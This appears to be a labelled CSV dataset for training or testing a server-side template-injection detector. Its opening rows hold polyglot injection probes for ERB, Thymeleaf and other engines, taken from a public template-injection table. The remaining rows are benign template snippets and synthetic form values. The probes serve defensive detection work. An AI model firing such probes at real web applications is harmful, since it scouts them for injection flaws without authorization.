&lt;%=1%&gt;#{2},&lt;%=N%&gt;#{N},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%=1%&gt;@*#{1},&lt;%=N%&gt;@*#{N},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%=1%>@*#{1},&lt;%=N%>@*#{N},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%{{#{%&gt;},&lt;%{{#{%&gt;},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##1{{!--{{1}}--}}-->*/#},//*<!--{##N{{!--{{N}}--}}-->*/#},multi,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##<%=1%>-->*/#},//*<!--{##<%=N%>-->*/#},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##<%=1%>--}}-->*/#},//*<!--{##<%=N%>--}}-->*/#},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##<%=1%>-}}-->*/#},//*<!--{##<%=N%>-}}-->*/#},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
//*<!--{##<%=1%>{{!--{{1}}--}}-->*/#},//*<!--{##<%=N%>{{!--{{N}}--}}-->*/#},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
1#{2}{{a}},N#{N}{{a}},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
1@*#{1},N@*#{N},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"38/52 error, 2/52 modified, length 13. It behaves identical to ${{<%[%'""}}%\. Unknown creator.","N/Nerror,N/Nmodified,lengthN.itbehavesidenticalto${{<%[%'""}}%\.unknowncreator.",ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<!-- /*<!--{##<%=1%>{{!--{{1}}--}}-->*/#} -->,<!--/*<!--{##<%=N%>{{!--{{N}}--}}-->*/#}-->,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<!--*<!--{##<%=1%>{{!--{{1}}--}}-->*/#}-->,<!--*<!--{##<%=N%>{{!--{{N}}--}}-->*/#}-->,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<!--[-->//*<!--{##<%=1%>{{!--{{1}}--}}-->*/#}<!--]-->,<!--[-->//*<!--{##<%=N%>{{!--{{N}}--}}-->*/#}<!--]-->,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<#set($x<%= with almost everything before appended until (inclusive) <#set($x<%={{={@{#{${xux}}%>),<#set($x<%=withalmosteverythingbeforeappendeduntil(inclusive)<#set($x<%={{={@{#{${xux}}%>),ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<#set($x<%=%>),<#set($x<%=%>),ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<#set($x<%={{={@{#{${xux}}%>),<#set($x<%={{={@{#{${xux}}%>),ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%%a%>,<%%a%>,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%-1-%>,<%-N-%>,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%= with almost everything before appended until (inclusive) <%={{={@{#{${xu}}%>,<%=withalmosteverythingbeforeappendeduntil(inclusive)<%={{={@{#{${xu}}%>,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>,<%=N%>,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>#{2},<%=N%>#{N},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>#{2}{{a}},<%=N%>#{N}{{a}},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>2{{a}},<%=N%>N{{a}},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>@*#1,<%=N%>@*#N,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>@*#{1},<%=N%>@*#{N},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%=1%>@*1,<%=N%>@*N,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%={{={@{#{${xu}}%>,<%={{={@{#{${xu}}%>,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
<%a%>,<%a%>,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"<p>"">[[${{1}}]]</p>","<p>"">[[${{N}}]]</p>",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"<th:t=""${xu}#foreach.","<th:t=""${xu}#foreach.",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"<th:t=\""${xu}#foreach.< p=""""></th:t=\""${xu}#foreach.<>","<th:t=\""S""""S""${xu}#foreach.<>",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"a""&gt;##[[${1}]]","a""&gt;##[[${N}]]",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"a"">##[[$1]]","a"">##[[$N]]",unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"a"">##[[${1}]]","a"">##[[${N}]]",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"a"">##[[1]]","a"">##[[N]]",unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
a&quot;&gt;##[[${1}]],a&quot;&gt;##[[${N}]],java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"class=""ng-binding"">&lt;%=1%&gt;#{2}","class=""S"">&lt;%=N%&gt;#{N}",ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"class=""ng-binding"">p ""&gt;[[$1]]","class=""S"">p""&gt;[[$N]]",unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[$1]]","p"">[[$N]]",unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[$]]","p"">[[$]]",unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[${1}]]","p"">[[${N}]]",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[${{1}}]]","p"">[[${{N}}]]",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[1]]","p"">[[N]]",unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"p "">[[{1}]]","p"">[[{N}]]",unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
p &quot;&gt;[[$1]],p&quot;&gt;[[$N]],unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{##}/*#&lt;Mustache:0x00007f2c270be028&gt;*/,{##}/*#&lt;mustache:NxNfNcNbeN&gt;*/,unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{##}/*ARBITRARY*/,{##}/*arbitrary*/,unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{##}/*[object Object]*/,{##}/*[objectobject]*/,unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{#$1#}},{#$N#}},unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{#${{1}}#}},{#${{N}}#}},java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{#1#}},{#N#}},unknown,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{#{1}#}},{#{N}#}},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{{1in[1]}},{{Nin[N]}},multi,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{{1}},{{N}},multi,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{{1}}@*,{{N}}@*,multi,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
{{7}}},{{N}}},multi,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"{{ link_source_file(template.file_path, template.starting_line) }}","{{link_source_file(template.file_path,template.starting_line)}}",,Twig,0,benign,github:symfony/demo
46688,N,,,0,benign,github:Morzeux/HttpParamsDataset
"{{ form.submit(value=_('Unfollow'), class_='btn btn-outline-primary btn-sm') }}","{{form.submit(value=_('S'),class_='S')}}",,Jinja2,0,benign,github:miguelgrinberg/microblog
5239525099748134,N,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'http_error.name'|trans({status_code: 403}) }},{{'S'|trans({status_code:N})}},,Twig,0,benign,github:symfony/demo
1523492896649032,N,,,0,benign,github:Morzeux/HttpParamsDataset
1769642985963078,N,,,0,benign,github:Morzeux/HttpParamsDataset
<% if @profiles.size > 0 %>,<%if@profiles.size>N%>,,ERB,0,benign,github:sidekiq/sidekiq
noris,noris,,,0,benign,github:Morzeux/HttpParamsDataset
mo19bun0a,moNbunNa,,,0,benign,github:Morzeux/HttpParamsDataset
39643208v,Nv,,,0,benign,github:Morzeux/HttpParamsDataset
fitz,fitz,,,0,benign,github:Morzeux/HttpParamsDataset
nelia3,neliaN,,,0,benign,github:Morzeux/HttpParamsDataset
casanellas berlingery,casanellasberlingery,,,0,benign,github:Morzeux/HttpParamsDataset
{%- if method %},{%-ifmethod%},,Jinja2,0,benign,github:miguelgrinberg/microblog
pau gargallo 120 8-b,paugargalloNN-b,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'post.commented_on'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
yuh-tai,yuh-tai,,,0,benign,github:Morzeux/HttpParamsDataset
{{ is_rtl(locale.code) ? ' rtl' }},{{is_rtl(locale.code)?'S'}},,Twig,0,benign,github:symfony/demo
cristo,cristo,,,0,benign,github:Morzeux/HttpParamsDataset
<%= display_args(a) %>,<%=display_args(a)%>,,ERB,0,benign,github:sidekiq/sidekiq
yie-tarn,yie-tarn,,,0,benign,github:Morzeux/HttpParamsDataset
10630,N,,,0,benign,github:Morzeux/HttpParamsDataset
{% set _route = app.current_route %},{%set_route=app.current_route%},,Twig,0,benign,github:symfony/demo
chaucon caban,chauconcaban,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'action.sign_in'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
05212,N,,,0,benign,github:Morzeux/HttpParamsDataset
"<%= job_params(@dead, @dead.score) %>","<%=job_params(@dead,@dead.score)%>",,ERB,0,benign,github:sidekiq/sidekiq
65456048a,Na,,,0,benign,github:Morzeux/HttpParamsDataset
1827,N,,,0,benign,github:Morzeux/HttpParamsDataset
<%= relative_time(entry.at) %>,<%=relative_time(entry.at)%>,,ERB,0,benign,github:sidekiq/sidekiq
hortensia,hortensia,,,0,benign,github:Morzeux/HttpParamsDataset
46344401e,Ne,,,0,benign,github:Morzeux/HttpParamsDataset
broun_granlund@purplemoongrn.fi,broun_granlund@purplemoongrn.fi,,,0,benign,github:Morzeux/HttpParamsDataset
{{ app.user.fullname }},{{app.user.fullname}},,Twig,0,benign,github:symfony/demo
18858,N,,,0,benign,github:Morzeux/HttpParamsDataset
5527948175762743,N,,,0,benign,github:Morzeux/HttpParamsDataset
1959107690181502,N,,,0,benign,github:Morzeux/HttpParamsDataset
bryan,bryan,,,0,benign,github:Morzeux/HttpParamsDataset
darice,darice,,,0,benign,github:Morzeux/HttpParamsDataset
"{{ url_for('static', filename='loading.gif') }}","{{url_for('S',filename='S')}}",,Jinja2,0,benign,github:miguelgrinberg/microblog
8322,N,,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('Uptime') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
7828706714204414,N,,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('BackToApp') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
26241,N,,,0,benign,github:Morzeux/HttpParamsDataset
espaldilla,espaldilla,,,0,benign,github:Morzeux/HttpParamsDataset
"<%= url_params(""direction"") == 'asc' ? 'desc' : 'asc' %>","<%=url_params(""S"")=='S'?'S':'S'%>",,ERB,0,benign,github:sidekiq/sidekiq
quint,quint,,,0,benign,github:Morzeux/HttpParamsDataset
2253152365761758,N,,,0,benign,github:Morzeux/HttpParamsDataset
{{ task.description }},{{task.description}},,Jinja2,0,benign,github:miguelgrinberg/microblog
${listOwners},${listowners},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
{% include '_post.html' %},{%include'S'%},,Jinja2,0,benign,github:miguelgrinberg/microblog
<% end -%>,<%end-%>,,ERB,0,benign,github:sidekiq/sidekiq
"pl. juan de antxieta, 191, 13?g","pl.juandeantxieta,N,N?g",,,0,benign,github:Morzeux/HttpParamsDataset
montsech peleij,montsechpeleij,,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('ShowAll') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
3661940651728423,N,,,0,benign,github:Morzeux/HttpParamsDataset
<% unless retry_extra_items(job).empty? %>,<%unlessretry_extra_items(job).empty?%>,,ERB,0,benign,github:sidekiq/sidekiq
collazos de boedo,collazosdeboedo,,,0,benign,github:Morzeux/HttpParamsDataset
"escultor bauls, 96,","escultorbauls,N,",,,0,benign,github:Morzeux/HttpParamsDataset
chirona,chirona,,,0,benign,github:Morzeux/HttpParamsDataset
"poblets, els","poblets,els",,,0,benign,github:Morzeux/HttpParamsDataset
bernaden,bernaden,,,0,benign,github:Morzeux/HttpParamsDataset
buch als,buchals,,,0,benign,github:Morzeux/HttpParamsDataset
ibero,ibero,,,0,benign,github:Morzeux/HttpParamsDataset
28737,N,,,0,benign,github:Morzeux/HttpParamsDataset
<%= @count %>,<%=@count%>,,ERB,0,benign,github:sidekiq/sidekiq
<%= product_version %>,<%=product_version%>,,ERB,0,benign,github:sidekiq/sidekiq
<%= t('GoBack') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
elysee,elysee,,,0,benign,github:Morzeux/HttpParamsDataset
<%= code %>,<%=code%>,,ERB,0,benign,github:sidekiq/sidekiq
atajar,atajar,,,0,benign,github:Morzeux/HttpParamsDataset
demetre,demetre,,,0,benign,github:Morzeux/HttpParamsDataset
{{ app.request.query.get('redirect_to') }},{{app.request.query.get('S')}},,Twig,0,benign,github:symfony/demo
malanquilla,malanquilla,,,0,benign,github:Morzeux/HttpParamsDataset
{{ form_row(form.content) }},{{form_row(form.content)}},,Twig,0,benign,github:symfony/demo
salom,salom,,,0,benign,github:Morzeux/HttpParamsDataset
5568407559303725,N,,,0,benign,github:Morzeux/HttpParamsDataset
{% endmacro %},{%endmacro%},,Jinja2,0,benign,github:miguelgrinberg/microblog
<%= workset.size %>,<%=workset.size%>,,ERB,0,benign,github:sidekiq/sidekiq
bedon merlach,bedonmerlach,,,0,benign,github:Morzeux/HttpParamsDataset
de78e24423n6e,deNeNnNe,,,0,benign,github:Morzeux/HttpParamsDataset
ortigas huerta,ortigashuerta,,,0,benign,github:Morzeux/HttpParamsDataset
tyner,tyner,,,0,benign,github:Morzeux/HttpParamsDataset
sencelles,sencelles,,,0,benign,github:Morzeux/HttpParamsDataset
50786,N,,,0,benign,github:Morzeux/HttpParamsDataset
${pet.name},${pet.name},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
{% if not current_user.is_following(user) %},{%ifnotcurrent_user.is_following(user)%},,Jinja2,0,benign,github:miguelgrinberg/microblog
<% if @dead.size > 0 && @total_size > @count %>,<%if@dead.size>N&&@total_size>@count%>,,ERB,0,benign,github:sidekiq/sidekiq
{{ _route == 'blog_search' ? 'active' }},{{_route=='S'?'S'}},,Twig,0,benign,github:symfony/demo
7512207991188731,N,,,0,benign,github:Morzeux/HttpParamsDataset
5432,N,,,0,benign,github:Morzeux/HttpParamsDataset
97573176t,Nt,,,0,benign,github:Morzeux/HttpParamsDataset
"<%= @retry.error_backtrace.join(""<br/>"") %>","<%=@retry.error_backtrace.join(""S"")%>",,ERB,0,benign,github:sidekiq/sidekiq
36844689t,Nt,,,0,benign,github:Morzeux/HttpParamsDataset
9004541540453342,N,,,0,benign,github:Morzeux/HttpParamsDataset
"aljaraque 196, 11d","aljaraqueN,Nd",,,0,benign,github:Morzeux/HttpParamsDataset
acaudalador,acaudalador,,,0,benign,github:Morzeux/HttpParamsDataset
52,N,,,0,benign,github:Morzeux/HttpParamsDataset
4347901737228358,N,,,0,benign,github:Morzeux/HttpParamsDataset
marco polo,marcopolo,,,0,benign,github:Morzeux/HttpParamsDataset
6a0ato,NaNato,,,0,benign,github:Morzeux/HttpParamsDataset
{% if display_current_language %},{%ifdisplay_current_language%},,Twig,0,benign,github:symfony/demo
persaud,persaud,,,0,benign,github:Morzeux/HttpParamsDataset
09640,N,,,0,benign,github:Morzeux/HttpParamsDataset
loralie,loralie,,,0,benign,github:Morzeux/HttpParamsDataset
"calle pintor julian alcaraz, 108, 10-a","callepintorjulianalcaraz,N,N-a",,,0,benign,github:Morzeux/HttpParamsDataset
#{ownerInformation},#{ownerinformation},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
burns40,burnsN,,,0,benign,github:Morzeux/HttpParamsDataset
50227,N,,,0,benign,github:Morzeux/HttpParamsDataset
{{ controller.source_code }},{{controller.source_code}},,Twig,0,benign,github:symfony/demo
"<% if url_params(""direction"") == 'asc' %>","<%ifurl_params(""S"")=='S'%>",,ERB,0,benign,github:sidekiq/sidekiq
<%= t('ThreeMonths') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
{% if field.widget.input_type != 'hidden' -%},{%iffield.widget.input_type!='S'-%},,Jinja2,0,benign,github:miguelgrinberg/microblog
beckwith,beckwith,,,0,benign,github:Morzeux/HttpParamsDataset
17864,N,,,0,benign,github:Morzeux/HttpParamsDataset
173,N,,,0,benign,github:Morzeux/HttpParamsDataset
{% endset %},{%endset%},,Jinja2,0,benign,github:miguelgrinberg/microblog
18126,N,,,0,benign,github:Morzeux/HttpParamsDataset
cerratn de juarros,cerratndejuarros,,,0,benign,github:Morzeux/HttpParamsDataset
"{{ path('blog_index_paginated', {page: i, tag: tagName}) }}","{{path('S',{page:i,tag:tagname})}}",,Twig,0,benign,github:symfony/demo
arine,arine,,,0,benign,github:Morzeux/HttpParamsDataset
12480,N,,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('Context') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
intosh@corjet.cv,intosh@corjet.cv,,,0,benign,github:Morzeux/HttpParamsDataset
ponce vilda,poncevilda,,,0,benign,github:Morzeux/HttpParamsDataset
"urbanitzacio europa-fuentes de san bernabe s/n,","urbanitzacioeuropa-fuentesdesanbernabes/n,",,,0,benign,github:Morzeux/HttpParamsDataset
<%= erb :_nav %>,<%=erb:_nav%>,,ERB,0,benign,github:sidekiq/sidekiq
6h11a3rud9,NhNaNrudN,,,0,benign,github:Morzeux/HttpParamsDataset
glickman,glickman,,,0,benign,github:Morzeux/HttpParamsDataset
re98329e,reNe,,,0,benign,github:Morzeux/HttpParamsDataset
barbieri guamanzara,barbieriguamanzara,,,0,benign,github:Morzeux/HttpParamsDataset
{{ path('admin_post_index') }},{{path('S')}},,Twig,0,benign,github:symfony/demo
{{ comment.id }},{{comment.id}},,Twig,0,benign,github:symfony/demo
36683,N,,,0,benign,github:Morzeux/HttpParamsDataset
entrala,entrala,,,0,benign,github:Morzeux/HttpParamsDataset
calle fama 115 10g,callefamaNNg,,,0,benign,github:Morzeux/HttpParamsDataset
tabuyo-cardille@multaspendientes.bf,tabuyo-cardille@multaspendientes.bf,,,0,benign,github:Morzeux/HttpParamsDataset
ervino,ervino,,,0,benign,github:Morzeux/HttpParamsDataset
walberg@ytv.com.gn,walberg@ytv.com.gn,,,0,benign,github:Morzeux/HttpParamsDataset
<% if @dead.error_backtrace %>,<%if@dead.error_backtrace%>,,ERB,0,benign,github:sidekiq/sidekiq
"<%= t(""ClickToLearnMore"") %>","<%=t(""S"")%>",,ERB,0,benign,github:sidekiq/sidekiq
6233284855351457,N,,,0,benign,github:Morzeux/HttpParamsDataset
${currentPage < totalPages},${currentpage<totalpages},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
colls messegu,collsmessegu,,,0,benign,github:Morzeux/HttpParamsDataset
"errekerte 113,","errekerteN,",,,0,benign,github:Morzeux/HttpParamsDataset
"{{ path(app.current_route ?? 'blog_index', app.current_route_parameters|merge({_locale: locale.code})) }}","{{path(app.current_route??'S',app.current_route_parameters|merge({_locale:locale.code}))}}",,Twig,0,benign,github:symfony/demo
tivenys,tivenys,,,0,benign,github:Morzeux/HttpParamsDataset
10560589r,Nr,,,0,benign,github:Morzeux/HttpParamsDataset
2829,N,,,0,benign,github:Morzeux/HttpParamsDataset
<%= @count * (@current_page - 1) + index + 1 %>,<%=@count*(@current_page-N)+index+N%>,,ERB,0,benign,github:sidekiq/sidekiq
"c/ las niadas, 67 9?f","c/lasniadas,NN?f",,,0,benign,github:Morzeux/HttpParamsDataset
sibirskaia@euskalcasino.es,sibirskaia@euskalcasino.es,,,0,benign,github:Morzeux/HttpParamsDataset
sabiela,sabiela,,,0,benign,github:Morzeux/HttpParamsDataset
d8jami81t9,dNjamiNtN,,,0,benign,github:Morzeux/HttpParamsDataset
{% for locale in locales() %},{%forlocaleinlocales()%},,Twig,0,benign,github:symfony/demo
8781236153256548,N,,,0,benign,github:Morzeux/HttpParamsDataset
rabs,rabs,,,0,benign,github:Morzeux/HttpParamsDataset
ilsup,ilsup,,,0,benign,github:Morzeux/HttpParamsDataset
<%= h entry.queue %>,<%=hentry.queue%>,,ERB,0,benign,github:sidekiq/sidekiq
${visit?.description},${visit?.description},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
43893,N,,,0,benign,github:Morzeux/HttpParamsDataset
"calle romeral, 143, 7?h","calleromeral,N,N?h",,,0,benign,github:Morzeux/HttpParamsDataset
"<%= job_params(@job, @job.score) %>","<%=job_params(@job,@job.score)%>",,ERB,0,benign,github:sidekiq/sidekiq
sangborivutr@ssextremadura.gr,sangborivutr@ssextremadura.gr,,,0,benign,github:Morzeux/HttpParamsDataset
"{{ stimulus_action('login', 'prefillJaneAdmin') }}","{{stimulus_action('S','S')}}",,Twig,0,benign,github:symfony/demo
readling,readling,,,0,benign,github:Morzeux/HttpParamsDataset
"{{ post.publishedAt|format_datetime('medium', 'short', '', 'UTC') }}","{{post.publishedat|format_datetime('S','S','S','S')}}",,Twig,0,benign,github:symfony/demo
p$ipo,p$ipo,,,0,benign,github:Morzeux/HttpParamsDataset
<%= t('Latency') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
dis0reg2r,disNregNr,,,0,benign,github:Morzeux/HttpParamsDataset
{% if g.search_form %},{%ifg.search_form%},,Jinja2,0,benign,github:miguelgrinberg/microblog
{{ 'action.edit_post'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
<%= t('ScheduledJobs') %>,<%=t('S')%>,,ERB,0,benign,github:sidekiq/sidekiq
unzaga gomariz,unzagagomariz,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'title.edit_user'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
{{ 'menu.back_to_blog'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
65931091g,Ng,,,0,benign,github:Morzeux/HttpParamsDataset
alfonso,alfonso,,,0,benign,github:Morzeux/HttpParamsDataset
{% endif -%},{%endif-%},,Jinja2,0,benign,github:miguelgrinberg/microblog
sabino,sabino,,,0,benign,github:Morzeux/HttpParamsDataset
rollie,rollie,,,0,benign,github:Morzeux/HttpParamsDataset
las palmeras 91 5b,laspalmerasNNb,,,0,benign,github:Morzeux/HttpParamsDataset
3313243213262173,N,,,0,benign,github:Morzeux/HttpParamsDataset
{% block footer %},{%blockfooter%},,Twig,0,benign,github:symfony/demo
49719,N,,,0,benign,github:Morzeux/HttpParamsDataset
{{ asset('favicon.svg') }},{{asset('S')}},,Twig,0,benign,github:symfony/demo
@{__${owner.id},@{__${owner.id},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
913,N,,,0,benign,github:Morzeux/HttpParamsDataset
steklasa,steklasa,,,0,benign,github:Morzeux/HttpParamsDataset
3772,N,,,0,benign,github:Morzeux/HttpParamsDataset
cherwin4@xavipetit.mu,cherwinN@xavipetit.mu,,,0,benign,github:Morzeux/HttpParamsDataset
"<%= number_with_delimiter(queue_latency, precision: 2) %>","<%=number_with_delimiter(queue_latency,precision:N)%>",,ERB,0,benign,github:sidekiq/sidekiq
timmons,timmons,,,0,benign,github:Morzeux/HttpParamsDataset
dasie,dasie,,,0,benign,github:Morzeux/HttpParamsDataset
esdrs,esdrs,,,0,benign,github:Morzeux/HttpParamsDataset
26414,N,,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'title.twig_template_code'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
3471,N,,,0,benign,github:Morzeux/HttpParamsDataset
20001,N,,,0,benign,github:Morzeux/HttpParamsDataset
inmol4dor,inmolNdor,,,0,benign,github:Morzeux/HttpParamsDataset
8409,N,,,0,benign,github:Morzeux/HttpParamsDataset
sprouse,sprouse,,,0,benign,github:Morzeux/HttpParamsDataset
{{ field.label(class='form-check-label') }},{{field.label(class='S')}},,Jinja2,0,benign,github:miguelgrinberg/microblog
eu,eu,,,0,benign,github:Morzeux/HttpParamsDataset
47620,N,,,0,benign,github:Morzeux/HttpParamsDataset
"c/ el salvador 199, 9-a","c/elsalvadorN,N-a",,,0,benign,github:Morzeux/HttpParamsDataset
{{ 'title.add_comment'|trans }},{{'S'|trans}},,Twig,0,benign,github:symfony/demo
28530,N,,,0,benign,github:Morzeux/HttpParamsDataset
#{telephone},#{telephone},,Thymeleaf,0,benign,github:spring-projects/spring-petclinic
